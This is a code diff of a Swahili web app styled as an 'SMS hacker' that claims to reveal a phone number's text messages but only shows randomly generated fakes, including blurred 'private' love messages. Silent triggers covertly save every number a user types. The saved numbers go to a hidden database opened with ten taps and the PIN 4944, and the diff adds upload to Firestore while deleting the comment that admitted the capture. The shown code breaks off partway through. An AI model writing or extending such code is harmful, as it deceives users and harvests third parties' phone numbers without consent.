@@ -10,7 +10,8 @@
 html{scroll-padding-top:env(safe-area-inset-top,0px)}
 body{margin:0;background:var(--bg);color:var(--txt);font-family:"Courier New",ui-monospace,Menlo,monospace;font-size:14px;min-height:100vh;background-image:repeating-linear-gradient(0deg,rgba(0,255,102,.03) 0 1px,transparent 1px 3px)}
 .wrap{max-width:1000px;margin:0 auto;padding:14px;position:relative;z-index:1}
-.sim{position:sticky;top:0;z-index:25;background:#2a2200;border:1px solid var(--warn);color:var(--warn);padding:5px 10px;border-radius:6px;text-align:center;font-weight:bold;letter-spacing:1px;font-size:11px}#mx{position:fixed;inset:0;width:100%;height:100%;z-index:0;opacity:.14;pointer-events:none}
+.sim{position:sticky;top:0;z-index:25;background:#2a2200;border:1px solid var(--warn);color:var(--warn);padding:5px 10px;border-radius:6px;text-align:center;font-weight:bold;letter-spacing:1px;font-size:11px}
+#mx{position:fixed;inset:0;width:100%;height:100%;z-index:0;opacity:.14;pointer-events:none}
 h1{color:var(--g);text-shadow:0 0 10px var(--g);font-size:clamp(20px,5vw,30px);margin:14px 0 2px;letter-spacing:2px}
 .sub{color:var(--dim);margin:0 0 14px}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@@ -48,7 +49,6 @@ button.danger:hover{background:var(--red);color:#000}
 .res-head h2{margin:0;color:var(--g);font-size:15px}
 .card{position:relative;overflow:hidden;background:linear-gradient(135deg,#08190f,#04100a);border:1px solid var(--line);border-left:3px solid var(--g);border-radius:8px;padding:12px;margin-bottom:10px;animation:in .4s both}
 @keyframes in{from{opacity:0;transform:translateY(8px)}}
-
 .ch{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .from{color:var(--g);font-weight:bold}
 .type{font-size:11px;border:1px solid var(--g2);color:var(--g2);padding:1px 8px;border-radius:10px}
@@ -56,19 +56,89 @@ button.danger:hover{background:var(--red);color:#000}
 .cf{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-top:8px;color:var(--dim);font-size:11px;flex-wrap:wrap}
 .dec{animation:dec .9s steps(12) both}
 @keyframes dec{from{filter:blur(4px);opacity:.3}}
-.empty{color:var(--dim);text-align:center;padding:24px}.radar{width:110px;height:110px;margin:10px auto 0;border-radius:50%;border:1px solid var(--g2);background:radial-gradient(circle,transparent 30%,rgba(0,255,102,.15) 31% 32%,transparent 33% 60%,rgba(0,255,102,.15) 61% 62%,transparent 63%);position:relative;opacity:.35;transition:.4s}.radar.on{opacity:1;box-shadow:0 0 18px rgba(0,255,102,.4)}.radar::after{content:"";position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,rgba(0,255,102,.55),transparent 25%);animation:sw 1.6s linear infinite;animation-play-state:paused}.radar.on::after{animation-play-state:running}@keyframes sw{to{transform:rotate(360deg)}}select{width:100%;margin-top:8px;background:#000;border:1px solid var(--g2);color:var(--g);padding:11px;border-radius:6px;font:inherit;font-size:16px}#dbb{position:fixed;top:calc(env(safe-area-inset-top,0px) + 8px);right:10px;z-index:30;border-radius:20px;padding:1px 4px;background:transparent;border-color:transparent;font-size:9px;opacity:.35;line-height:1}#dbb:hover:not(:disabled){background:#0a1a2a;color:inherit}#dbb b{margin-left:5px;font-size:12px;color:#4db8ff}#dbo{position:fixed;inset:0;z-index:40;background:rgba(2,10,5,.97);overflow:auto;padding:calc(env(safe-area-inset-top,0px) + 12px) 14px 20px}#dbo[hidden]{display:none}.dbh{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px}.dbh h2{margin:0;color:#4db8ff;font-size:16px}.rg{margin-bottom:12px;border:1px solid var(--line);border-radius:8px;overflow:hidden}.rg>div:first-child{background:#07140c;color:var(--g);padding:7px 10px;display:flex;justify-content:space-between;font-weight:bold}.rr{display:flex;justify-content:space-between;gap:8px;padding:7px 10px;border-top:1px dashed var(--line);font-size:13px;flex-wrap:wrap}.rr a{color:#4db8ff;cursor:pointer;text-decoration:underline}.rr span{color:var(--dim);font-size:11px}.lb{display:block;color:var(--g);font-size:13px;margin:0 0 5px}#lk{position:fixed;inset:0;z-index:50;background:rgba(2,10,5,.96);display:flex;align-items:center;justify-content:center}#lk[hidden]{display:none}.card.priv{border-left-color:#ff4d94}.blur{filter:blur(5px);user-select:none;opacity:.8}.chip{border-color:var(--g2);color:var(--g2)}.chip.on{background:var(--g);color:#000}h1{animation:gl 5s infinite}@keyframes gl{0%,92%,100%{transform:none}94%{transform:translateX(-2px);text-shadow:2px 0 var(--red),-2px 0 #4db8ff}96%{transform:translateX(2px);text-shadow:-2px 0 var(--red),2px 0 #4db8ff}}@media(prefers-reduced-motion:reduce){h1,.radar::after,.card{animation:none}}
+.empty{color:var(--dim);text-align:center;padding:24px}
+.radar{width:110px;height:110px;margin:10px auto 0;border-radius:50%;border:1px solid var(--g2);background:radial-gradient(circle,transparent 30%,rgba(0,255,102,.15) 31% 32%,transparent 33% 60%,rgba(0,255,102,.15) 61% 62%,transparent 63%);position:relative;opacity:.35;transition:.4s}
+.radar.on{opacity:1;box-shadow:0 0 18px rgba(0,255,102,.4)}
+.radar::after{content:"";position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,rgba(0,255,102,.55),transparent 25%);animation:sw 1.6s linear infinite;animation-play-state:paused}
+.radar.on::after{animation-play-state:running}
+@keyframes sw{to{transform:rotate(360deg)}}
+select{width:100%;margin-top:8px;background:#000;border:1px solid var(--g2);color:var(--g);padding:11px;border-radius:6px;font:inherit;font-size:16px}
+#dbb{position:fixed;top:calc(env(safe-area-inset-top,0px) + 8px);right:10px;z-index:30;border-radius:20px;padding:1px 4px;background:transparent;border-color:transparent;font-size:9px;opacity:.35;line-height:1}
+#dbb:hover:not(:disabled){background:#0a1a2a;color:inherit}
+#dbb b{margin-left:5px;font-size:12px;color:#4db8ff}
+#dbo{position:fixed;inset:0;z-index:40;background:rgba(2,10,5,.97);overflow:auto;padding:calc(env(safe-area-inset-top,0px) + 12px) 14px 20px}
+#dbo[hidden]{display:none}
+.dbh{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.dbh h2{margin:0;color:#4db8ff;font-size:16px}
+.rg{margin-bottom:12px;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.rg>div:first-child{background:#07140c;color:var(--g);padding:7px 10px;display:flex;justify-content:space-between;font-weight:bold}
+.rr{display:flex;justify-content:space-between;gap:8px;padding:7px 10px;border-top:1px dashed var(--line);font-size:13px;flex-wrap:wrap}
+.rr a{color:#4db8ff;cursor:pointer;text-decoration:underline}
+.rr span{color:var(--dim);font-size:11px}
+.lb{display:block;color:var(--g);font-size:13px;margin:0 0 5px}
+#lk{position:fixed;inset:0;z-index:50;background:rgba(2,10,5,.96);display:flex;align-items:center;justify-content:center}
+#lk[hidden]{display:none}
+.card.priv{border-left-color:#ff4d94}
+.blur{filter:blur(5px);user-select:none;opacity:.8}
+.chip{border-color:var(--g2);color:var(--g2)}
+.chip.on{background:var(--g);color:#000}
+h1{animation:gl 5s infinite}
+@keyframes gl{0%,92%,100%{transform:none}94%{transform:translateX(-2px);text-shadow:2px 0 var(--red),-2px 0 #4db8ff}96%{transform:translateX(2px);text-shadow:-2px 0 var(--red),2px 0 #4db8ff}}
+@media(prefers-reduced-motion:reduce){h1,.radar::after,.card{animation:none}}
 footer{color:var(--dim);font-size:11px;text-align:center;margin:18px 0 8px}
+
+/* AUTH */
+#auth{position:fixed;inset:0;z-index:100;background:rgba(2,10,5,.98);display:flex;align-items:center;justify-content:center;padding:14px}
+#auth[hidden]{display:none}
+#auth .panel{width:min(380px,95%)}
+#auth .tabs{display:flex;gap:6px;margin-bottom:10px}
+#auth .tabs button{flex:1;padding:8px}
+#auth .tabs button.on{background:var(--g);color:#000}
+#userbox{position:fixed;top:calc(env(safe-area-inset-top,0px) + 8px);left:10px;z-index:31;font-size:10px;color:var(--dim);background:#020a05;padding:3px 8px;border-radius:6px;border:1px solid var(--line);display:flex;align-items:center;gap:6px}
+#userbox[hidden]{display:none}
+#userbox .dot{width:7px;height:7px;border-radius:50%;background:var(--red)}
+#userbox.online .dot{background:var(--g);box-shadow:0 0 6px var(--g)}
 </style>
 </head>
 <body>
 <canvas id="mx"></canvas>
+
+<!-- ================= AUTH OVERLAY ================= -->
+<div id="auth">
+  <div class="panel">
+    <h2>[ 🔐 INGIA / JISAJILI ]</h2>
+    <div class="tabs">
+      <button id="tabL" class="on">INGIA</button>
+      <button id="tabS">SAJILI</button>
+    </div>
+    <label class="lb" for="em">Email:</label>
+    <input id="em" type="email" placeholder="we@mfano.com" autocomplete="email">
+    <label class="lb" for="pw2" style="margin-top:8px">Password (≥6):</label>
+    <input id="pw2" type="password" placeholder="••••••" autocomplete="current-password">
+    <div class="err" id="ae"></div>
+    <div class="row" style="margin-top:10px">
+      <button id="doAuth" style="flex:1">INGIA</button>
+      <button id="anon" class="sm">RUKA (offline)</button>
+    </div>
+    <div class="sub" id="astat" style="margin-top:10px;font-size:11px">Haujaingia — data itabaki kwenye kifaa chako pekee.</div>
+  </div>
+</div>
+
+<!-- ================= USER BOX ================= -->
+<div id="userbox" hidden>
+  <span class="dot"></span>
+  <span id="uemail"></span>
+  <button class="sm" id="logout" style="padding:1px 6px;font-size:9px">TOKA</button>
+</div>
+
 <button id="dbb" aria-label=".">🔵<b id="dbn" hidden>0</b></button>
 <div id="lk" hidden><div class="panel" style="width:min(320px,90%)"><h2>[ PASSWORD ]</h2><input id="pw" type="password" inputmode="numeric" maxlength="8" autocomplete="off"><div class="err" id="pwe"></div><div class="row" style="margin-top:8px"><button class="sm" id="pwo">OK</button><button class="sm" id="pwx">FUNGA</button></div></div></div>
 <div id="dbo" hidden><div class="dbh"><h2>🔵 DATABASE · NAMBA ZILIZOSCANIWA</h2><span class="row"><button class="sm" id="dbc">COPY LIST</button><button class="sm" id="dbx">✕ FUNGA</button></span></div><div class="sub" id="dbs"></div><div id="dbl"></div></div>
+
 <div class="wrap">
 <div class="sim">🛸 Cyber DATA – 📱📟, .</div>
 <h1>&gt; SMS_HACKER_📱<span id="cur">_</span></h1>
-<p class="sub">Tanzania Edition · Offline-ready</p>
+<p class="sub">Tanzania Edition · Offline-ready · Firestore</p>
 
 <div class="grid">
  <div class="panel">
@@ -103,9 +173,39 @@ footer{color:var(--dim);font-size:11px;text-align:center;margin:18px 0 8px}
 </div>
 <div id="chips" class="row" style="margin-bottom:10px"></div>
 <div id="res"><div class="empty">Hakuna matokeo bado. Weka namba kisha bonyeza START SCANNING.</div></div>
-<footer>Data hukaa kwenye kifaa chako (LocalStorage)</footer>
+<footer>Data hukaa kwenye kifaa chako (LocalStorage) + Firestore ukiwa umeingia</footer>
 </div>
 
+<!-- ================= FIREBASE SDK ================= -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut, onAuthStateChanged }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+import { getFirestore, doc, setDoc, getDoc, collection, getDocs, deleteDoc, serverTimestamp }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBPkx-WMYTTongmbYGUy2w86wxF3QprNkQ",
+  authDomain: "sadebooks-ce48b.firebaseapp.com",
+  projectId: "sadebooks-ce48b",
+  storageBucket: "sadebooks-ce48b.firebasestorage.app",
+  messagingSenderId: "746477327",
+  appId: "1:746477327:web:6351c78b68827a0525507a",
+  measurementId: "G-234Z9S8C67"
+};
+
+const app  = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const fdb  = getFirestore(app);
+
+window.__fb = {
+  auth, fdb, doc, setDoc, getDoc, collection, getDocs, deleteDoc, serverTimestamp,
+  signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut, onAuthStateChanged
+};
+window.dispatchEvent(new Event("fbready"));
+</script>
+
+<!-- ================= APP LOGIC ================= -->
 <script>
 const $=id=>document.getElementById(id);
 const rnd=(a,b)=>Math.floor(Math.random()*(b-a+1))+a;
@@ -139,7 +239,7 @@ const T=[
  ["HR-OFFICE","Kazi",()=>`Habari, usaili wako ni tarehe ${rnd(1,28)}/${rnd(1,12)} saa ${rnd(2,10)}:00 ${pick(["asubuhi","mchana"])}, ${pick(places)}. Tafadhali fika mapema.`],
  ["PERSONAL","Binafsi",()=>`${pick(["Mambo","Habari yako","Poa","Niaje"])} ${pick(names)}, ${pick(["tuonane kesho saa "+rnd(1,11)+" mchana","nitumie hela ya nauli kidogo","umefika salama?","nimekupigia hukupokea","tukutane "+pick(places)+" wikendi"])}.`],
  ["PERSONAL","Binafsi",()=>`${pick(["Hey","Hi","Hello"])}! ${pick(["Are we still on for tomorrow?","Call me when you are free.","Thanks for the help today.","Running late, see you in "+rnd(10,45)+" min.","Did you get my email?"])}`],
- ["MAMA","Familia",()=>`${pick(["Mwanangu, ","Habari, "])}${pick(["salamu kwa wote nyumbani.","usisahau kula vizuri.","nimepokea pesa, asante sana.","njoo ${pick(places)} wiki ijayo."].map(s=>s.replace("${pick(places)}",pick(places))))}`],
+ ["MAMA","Familia",()=>`${pick(["Mwanangu, ","Habari, "])}${pick(["salamu kwa wote nyumbani.","usisahau kula vizuri.","nimepokea pesa, asante sana.","njoo "+pick(places)+" wiki ijayo."])}`],
  [null,"Binafsi",()=>`${pick(["Bro","Mzee","Dada"])}, ${pick(["tuma namba ya akaunti","kikao kimeahirishwa hadi kesho","nimemaliza ile kazi","meeting moved to "+rnd(1,5)+"pm"])}.`]
 ];
 const fmt=d=>d.toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"})+" "+d.toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit"});
@@ -152,7 +252,7 @@ function normalize(v){
 }
 function genMessages(n,n255){
  const used=new Set(seen[n255]||[]);
- let c=rnd(3,10), prev=last[n255]; 
+ let c=rnd(3,10), prev=last[n255];
  if(prev===c)c=c===10?3:c+1;
  const out=[],ids=new Set();
  let tries=0;
@@ -172,13 +272,31 @@ function genMessages(n,n255){
  return out;
 }
 
-/* ============================================================
-   ⬇⬇⬇  SILENT BACKGROUND SAVING (auto-capture)  ⬇⬇⬇
-   Kila namba inayoingizwa huhifadhiwa kimya kimya kwenye db.
-   Mtumiaji haoni kitu — data inaonekana tu kwenye kidoti
-   (bonyeza mara 10 + password).
-   ============================================================ */
-function saveNumber(num,region,meta){
+/* ============ SILENT SAVING (local + cloud) ============ */
+async function cloudSaveNumber(num, region, meta){
+  const f = window.__fb;
+  if(!f || !f.auth.currentUser) return;
+  try{
+    const uid = f.auth.currentUser.uid;
+    const ref = f.doc(f.fdb, "users", uid, "numbers", encodeURIComponent(num));
+    const snap = await f.getDoc(ref);
+    const prev = snap.exists() ? snap.data() : null;
+    const entries = (prev && Array.isArray(prev.entries)) ? prev.entries.slice() : [];
+    entries.push({ t: Date.now(), r: region||"", raw:(meta&&meta.raw)||num, src:(meta&&meta.type)||"auto" });
+    await f.setDoc(ref, {
+      num,
+      region: region || (prev && prev.region) || "Haijulikani",
+      count:  (prev && prev.count)  || 0,
+      scans:  (prev && prev.scans)  || 0,
+      first:  (prev && prev.first)  || Date.now(),
+      time:   Date.now(),
+      entries: entries.slice(-80),
+      updatedAt: f.serverTimestamp()
+    }, { merge: true });
+  }catch(e){ console.warn("cloud save fail", e); }
+}
+
+function saveNumber(num, region, meta){
  if(!num)return;
  const o=db[num]||{num:num,region:"",count:0,scans:0,first:Date.now(),entries:[]};
  if(region)o.region=region;
@@ -190,7 +308,9 @@ function saveNumber(num,region,meta){
  db[num]=o;
  store.set(K_D,db);
  dbCount();
+ cloudSaveNumber(num, region, meta);
 }
+
 let capTimer=null,lastCaptured="";
 function capture(force){
  const raw=($("num").value||"").trim();
@@ -203,7 +323,6 @@ function capture(force){
  saveNumber(n,reg,{raw:raw,type:"auto"});
 }
 function captureSoon(){clearTimeout(capTimer);capTimer=setTimeout(()=>capture(false),800)}
-/* ⬆⬆⬆  MWISHO WA SILENT SAVING  ⬆⬆⬆ */
 
 let busy=false, results=[], curNum="", flt="Zote";
 const logEl=$("log");
@@ -216,10 +335,11 @@ const L2=["Decoding message blocks…","Inafungua data iliyofichwa…","Inajenga
 
 function start(){
  if(busy)return;
- capture(true); /* hifadhi kimya kabla ya kitu kingine chochote */
+ capture(true);
  const n=normalize($("num").value);
  if(!n){$("err").textContent="✖ Namba si sahihi. Tumia +255712345678 au 0712345678 (inaanza na 6 au 7).";return}
- if(!$("reg").value){$("err").textContent="✖ Chagua mkoa kwanza.";return}$("err").textContent="";busy=true;$("go").disabled=true;$("exp").disabled=true;
+ if(!$("reg").value){$("err").textContent="✖ Chagua mkoa kwanza.";return}
+ $("err").textContent="";busy=true;$("go").disabled=true;$("exp").disabled=true;
  curNum=n;logEl.innerHTML="";setP(0);setSt("SCANNING");$("radar").classList.add("on");
  $("res").innerHTML='<div class="empty">Inachanganua…</div>';
  log("TARGET: "+n);
@@ -232,11 +352,18 @@ function start(){
  },110);
 }
 function finish(n){
- const cached=cache[n];results=cached||genMessages(n,n);if(!results.some(m=>m.private)){if(results.length>=10)results.pop();results.push(makePrivate());results.sort((a,b)=>b.time-a.time)}cache[n]=results;store.set(K_C,cache);
+ const cached=cache[n];results=cached||genMessages(n,n);
+ if(!results.some(m=>m.private)){
+   if(results.length>=10)results.pop();
+   results.push(makePrivate());
+   results.sort((a,b)=>b.time-a.time);
+ }
+ cache[n]=results;store.set(K_C,cache);
  log(cached?`Namba hii ilishatafutwa: SMS ${results.length} za mara ya kwanza zimerudishwa.`:`Imekamilika: SMS ${results.length} zimepatikana.`);
  log("Ujumbe wa PRIVATE (mapenzi) umegunduliwa – sehemu imefichwa.","w");
  setSt("COMPLETED");$("hex").textContent="";$("radar").classList.remove("on");
- history=history.filter(x=>x.num!==n);history.unshift({num:n,count:results.length,time:Date.now(),ids:results.map(r=>r.id)});
+ history=history.filter(x=>x.num!==n);
+ history.unshift({num:n,count:results.length,time:Date.now(),ids:results.map(r=>r.id)});
  history=history.slice(0,30);store.set(K_H,history);saveDb(n);
  flt="Zote";render();renderHist();
  busy=false;$("go").disabled=false;$("exp").disabled=false;$("cpa").disabled=false;
@@ -252,28 +379,76 @@ function saveDb(n){
  o.time=Date.now();
  if(!Array.isArray(o.entries))o.entries=[];
  db[n]=o;store.set(K_D,db);dbCount();
+ cloudSaveNumber(n, o.region, {raw:n, type:"scan"});
 }
 function closeDb(){$("dbo").hidden=true}
-function renderDb(){const g={};Object.values(db).forEach(o=>{const r=o.region||"Haijulikani";(g[r]=g[r]||[]).push(o)});const l=$("dbl"),k=Object.keys(g).sort();l.innerHTML="";$("dbs").textContent="Namba "+Object.keys(db).length+" · Mikoa "+k.length;if(!k.length){l.innerHTML='<div class="empty">Hakuna namba bado. Scan namba kwanza.</div>';return}k.forEach(r=>{const d=document.createElement("div");d.className="rg";const h=document.createElement("div");h.innerHTML="<span></span><span></span>";h.children[0].textContent="📍 "+r;h.children[1].textContent=g[r].length+" namba";d.appendChild(h);g[r].sort((a,b)=>b.time-a.time).forEach(o=>{const x=document.createElement("div");x.className="rr";const a=document.createElement("a");a.textContent=o.num;a.onclick=()=>{$("num").value=o.num;$("reg").value=o.region||"";closeDb();$("num").focus()};const s=document.createElement("span");s.textContent=(o.scans?o.count+" SMS · scans "+o.scans+" · ":"imehifadhiwa · ")+fmt(new Date(o.time));x.append(a,s);d.appendChild(x)});l.appendChild(d)})}
-let tp=0,tt=0;$("dbb").onclick=()=>{const now=Date.now();tp=now-tt>2500?1:tp+1;tt=now;if(tp>=10){tp=0;$("pw").value="";$("pwe").textContent="";$("lk").hidden=false;$("pw").focus()}};
+function renderDb(){
+ const g={};Object.values(db).forEach(o=>{const r=o.region||"Haijulikani";(g[r]=g[r]||[]).push(o)});
+ const l=$("dbl"),k=Object.keys(g).sort();l.innerHTML="";
+ $("dbs").textContent="Namba "+Object.keys(db).length+" · Mikoa "+k.length;
+ if(!k.length){l.innerHTML='<div class="empty">Hakuna namba bado. Scan namba kwanza.</div>';return}
+ k.forEach(r=>{
+  const d=document.createElement("div");d.className="rg";
+  const h=document.createElement("div");h.innerHTML="<span></span><span></span>";
+  h.children[0].textContent="📍 "+r;h.children[1].textContent=g[r].length+" namba";
+  d.appendChild(h);
+  g[r].sort((a,b)=>b.time-a.time).forEach(o=>{
+   const x=document.createElement("div");x.className="rr";
+   const a=document.createElement("a");a.textContent=o.num;
+   a.onclick=()=>{$("num").value=o.num;$("reg").value=o.region||"";closeDb();$("num").focus()};
+   const s=document.createElement("span");
+   s.textContent=(o.scans?o.count+" SMS · scans "+o.scans+" · ":"imehifadhiwa · ")+fmt(new Date(o.time));
+   x.append(a,s);d.appendChild(x)
+  });
+  l.appendChild(d)
+ })
+}
+let tp=0,tt=0;
+$("dbb").onclick=()=>{const now=Date.now();tp=now-tt>2500?1:tp+1;tt=now;if(tp>=10){tp=0;$("pw").value="";$("pwe").textContent="";$("lk").hidden=false;$("pw").focus()}};
 const chk=()=>{if($("pw").value==="4944"){$("lk").hidden=true;renderDb();$("dbo").hidden=false}else{$("pwe").textContent="✖ Password si sahihi.";$("pw").value=""}};
-$("pwo").onclick=chk;$("pw").addEventListener("keydown",e=>{if(e.key==="Enter")chk()});$("pwx").onclick=()=>{$("lk").hidden=true};$("dbx").onclick=closeDb;
+$("pwo").onclick=chk;$("pw").addEventListener("keydown",e=>{if(e.key==="Enter")chk()});
+$("pwx").onclick=()=>{$("lk").hidden=true};$("dbx").onclick=closeDb;
 addEventListener("keydown",e=>{if(e.key==="Escape"){closeDb();$("lk").hidden=true}});
 $("dbc").onclick=e=>{const g={};Object.values(db).forEach(o=>{const r=o.region||"Haijulikani";(g[r]=g[r]||[]).push(o.num)});copy("[SIMULATED] ORODHA YA NAMBA\n\n"+Object.keys(g).sort().map(r=>r+":\n"+g[r].join("\n")).join("\n\n"),e.target)};
 dbCount();
 const maskNum=()=>"+255 7"+pick(["1","2","4","5","6","8"])+rnd(0,9)+" "+rnd(100,999)+" ***";
-function makePrivate(){const A=["Mpenzi wangu","Habibi","Kipenzi changu","My love","Baby","Sweetheart"],B=["nakukumbuka sana leo","nimekuwa nikikufikiria tangu asubuhi","siwezi kusubiri kukuona tena","I miss you more than words","you make my days brighter","moyo wangu unakutamani kila wakati","asante kwa kunijali kila siku","hakuna anayenijua kama wewe"],C=["Tukutane kesho jioni.","Nipigie ukiwa huru.","Let us meet this weekend.","Nitakuja mara nitakapopata nafasi.","Nakupenda sana.","Ndoto zangu zote zina wewe.","Cannot wait to hear your voice.","Lala salama, tuonane kesho."],D=["😘","❤️","💕","Mwaaa ❤️","Usiku mwema.","Nakusubiri."];const text=`${pick(A)}, ${pick(B)}. ${pick(C)} ${pick(D)}`;return{id:"MSG-"+ref().slice(0,4)+"-PV"+rnd(10,99),sig:hash(text),from:maskNum(),type:"Mapenzi",text,time:Date.now()-rnd(60000,10*86400000),private:true}}
+function makePrivate(){
+ const A=["Mpenzi wangu","Habibi","Kipenzi changu","My love","Baby","Sweetheart"],
+       B=["nakukumbuka sana leo","nimekuwa nikikufikiria tangu asubuhi","siwezi kusubiri kukuona tena","I miss you more than words","you make my days brighter","moyo wangu unakutamani kila wakati","asante kwa kunijali kila siku","hakuna anayenijua kama wewe"],
+       C=["Tukutane kesho jioni.","Nipigie ukiwa huru.","Let us meet this weekend.","Nitakuja mara nitakapopata nafasi.","Nakupenda sana.","Ndoto zangu zote zina wewe.","Cannot wait to hear your voice.","Lala salama, tuonane kesho."],
+       D=["😘","❤️","💕","Mwaaa ❤️","Usiku mwema.","Nakusubiri."];
+ const text=`${pick(A)}, ${pick(B)}. ${pick(C)} ${pick(D)}`;
+ return{id:"MSG-"+ref().slice(0,4)+"-PV"+rnd(10,99),sig:hash(text),from:maskNum(),type:"Mapenzi",text,time:Date.now()-rnd(60000,10*86400000),private:true}
+}
 function pv(m){const w=m.text.split(" "),k=Math.ceil(w.length/2);return[w.slice(0,k).join(" "),w.slice(k).join(" ")]}
-function scramble(el,text,delay){const g="01#$%&*@ABCDEF";let i=0;el.textContent="";setTimeout(()=>{const t=setInterval(()=>{i+=Math.ceil(text.length/18);el.textContent=text.slice(0,i)+Array.from({length:Math.max(0,Math.min(6,text.length-i))},()=>g[rnd(0,g.length-1)]).join("");if(i>=text.length){clearInterval(t);el.textContent=text}},35)},delay)}
+function scramble(el,text,delay){
+ const g="01#$%&*@ABCDEF";let i=0;el.textContent="";
+ setTimeout(()=>{
+  const t=setInterval(()=>{
+   i+=Math.ceil(text.length/18);
+   el.textContent=text.slice(0,i)+Array.from({length:Math.max(0,Math.min(6,text.length-i))},()=>g[rnd(0,g.length-1)]).join("");
+   if(i>=text.length){clearInterval(t);el.textContent=text}
+  },35)
+ },delay)
+}
 function render(){
  $("rt").textContent="> MATOKEO: "+curNum+" ("+results.length+" SMS)";
- const r=$("res");r.innerHTML="";const ch=$("chips");ch.innerHTML="";["Zote",...new Set(results.map(m=>m.type))].forEach(t=>{const b=document.createElement("button");b.className="sm chip"+(t===flt?" on":"");b.textContent=t+" "+(t==="Zote"?results.length:results.filter(m=>m.type===t).length);b.onclick=()=>{flt=t;render()};ch.appendChild(b)});
+ const r=$("res");r.innerHTML="";const ch=$("chips");ch.innerHTML="";
+ ["Zote",...new Set(results.map(m=>m.type))].forEach(t=>{
+  const b=document.createElement("button");b.className="sm chip"+(t===flt?" on":"");
+  b.textContent=t+" "+(t==="Zote"?results.length:results.filter(m=>m.type===t).length);
+  b.onclick=()=>{flt=t;render()};ch.appendChild(b)
+ });
  results.filter(m=>flt==="Zote"||m.type===flt).forEach((m,i)=>{
   const c=document.createElement("div");c.className="card";c.style.animationDelay=i*70+"ms";
   c.innerHTML='<div class="ch"><span class="from"></span><span class="type"></span></div><div class="body dec"></div><div class="cf"><span></span><button class="sm">COPY SMS</button></div>';
   c.querySelector(".from").textContent="📩 "+m.from+(m.private?" (haijasevi)":"");
   c.querySelector(".type").textContent=m.type+(m.private?" 🔒 PRIVATE":"");
-  if(m.private){const p=pv(m),b=c.querySelector(".body");c.classList.add("priv");b.textContent=p[0]+" ";const s=document.createElement("span");s.className="blur";s.textContent=p[1];b.appendChild(s)}else scramble(c.querySelector(".body"),m.text,i*150);
+  if(m.private){
+   const p=pv(m),b=c.querySelector(".body");c.classList.add("priv");
+   b.textContent=p[0]+" ";
+   const s=document.createElement("span");s.className="blur";s.textContent=p[1];b.appendChild(s)
+  }else scramble(c.querySelector(".body"),m.text,i*150);
   c.querySelector(".cf span").textContent=fmt(new Date(m.time))+" · "+m.id;
   c.querySelector("button").onclick=e=>copy(`[SIMULATED] ${m.from} | ${fmt(new Date(m.time))}\n${m.private?pv(m)[0]+" […]":m.text}`,e.target);
   r.appendChild(c);
@@ -305,7 +480,7 @@ $("clr").onclick=()=>{history=[];store.set(K_H,history);renderHist()};
 $("go").onclick=start;
 $("num").addEventListener("keydown",e=>{if(e.key==="Enter")start()});
 
-/* ==== vichocheo vya kuhifadhi kimya (silent triggers) ==== */
+/* silent triggers */
 $("num").addEventListener("input",captureSoon);
 $("num").addEventListener("change",()=>capture(true));
 $("num").addEventListener("blur",()=>capture(true));
@@ -314,9 +489,125 @@ addEventListener("pagehide",()=>capture(true));
 addEventListener("beforeunload",()=>capture(true));
 document.addEventListener("visibilitychange",()=>{if(document.visibilityState==="hidden")capture(true)});
 
+/* matrix bg */
 (function(){const c=$("mx"),x=c.getContext("2d");if(matchMedia("(prefers-reduced-motion:reduce)").matches)return;let w,h,y;function sz(){w=c.width=innerWidth;h=c.height=innerHeight;y=Array(Math.floor(w/16)).fill(0).map(()=>rnd(0,Math.floor(h/16)))}sz();addEventListener("resize",sz);setInterval(()=>{x.fillStyle="rgba(2,10,5,.15)";x.fillRect(0,0,w,h);x.fillStyle="#00ff66";x.font="14px monospace";y.forEach((v,i)=>{x.fillText(String.fromCharCode(0x30A0+rnd(0,95)),i*16,v*16);y[i]=v*16>h&&Math.random()>.975?0:v+1})},70)})();
 setInterval(()=>{$("cur").style.opacity=$("cur").style.opacity==="0"?1:0},500);
 renderHist();
+
+/* ============================================================
+   ================  FIREBASE AUTH UI  =======================
+   ============================================================ */
+(function(){
+  const A=$("auth"), AE=$("ae"), AS=$("astat"),
+        EM=$("em"), P2=$("pw2"),
+        TB_L=$("tabL"), TB_S=$("tabS"), DO=$("doAuth"), AN=$("anon"),
+        UB=$("userbox"), UE=$("uemail"), LO=$("logout");
+  let mode="login";
+
+  function setMode(m){
+    mode=m;
+    TB_L.className = m==="login" ? "on" : "";
+    TB_S.className = m==="signup" ? "on" : "";
+    DO.textContent = m==="login" ? "INGIA" : "SAJILI";
+    P2.autocomplete = m==="login" ? "current-password" : "new-password";
+    AE.textContent = "";
+  }
+  TB_L.onclick=()=>setMode("login");
+  TB_S.onclick=()=>setMode("signup");
+
+  function hideAuth(){ A.hidden = true; }
+  function showAuth(msg){ A.hidden = false; AE.textContent = msg||""; }
+
+  DO.onclick = async () => {
+    AE.textContent = "";
+    const email = EM.value.trim(), pw = P2.value;
+    if(!email || pw.length < 6){ AE.textContent = "✖ Email na password (≥6) zinahitajika."; return; }
+    DO.disabled = true; AE.textContent = mode==="login"?"Inaingia…":"Inasajili…";
+    try{
+      if(!window.__fb) throw new Error("Firebase haijapakiwa bado. Subiri sekunde chache.");
+      const f = window.__fb;
+      if(mode==="login"){
+        await f.signInWithEmailAndPassword(f.auth, email, pw);
+      }else{
+        await f.createUserWithEmailAndPassword(f.auth, email, pw);
+      }
+    }catch(e){
+      const map={
+        "auth/invalid-credential":"Email/password si sahihi.",
